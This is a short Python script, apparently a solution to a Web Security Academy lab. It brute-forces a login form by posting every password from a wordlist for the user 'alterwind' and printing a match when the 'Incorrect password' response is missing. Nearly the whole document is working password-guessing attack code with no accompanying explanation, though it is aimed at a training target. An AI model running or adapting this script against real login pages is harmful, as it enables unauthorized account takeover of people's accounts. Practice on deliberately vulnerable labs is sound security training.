
#ad

import requests


fd = open('usernames.txt','r')
wordlist = fd.read()
fd.close()

usernames = list(wordlist.split('\n'))
#print(usernames)

fd = open('passwords.txt','r')
wordlist = fd.read()
fd.close()

passwords = list(wordlist.split('\n'))
#print(passwords)

#alterwind

url = "https://ac6e1f8a1ff388518084cb1d00e30094.web-security-academy.net/login"

#username=admin&password=admin

for i in passwords:
	data2 = {
		"username":"alterwind",
		"password":i
	}

	r = requests.post(url,data=data2)
	if "Incorrect password" not in r.text:
		print("Password Found for the user {} is {} ".format("alterwind",i))
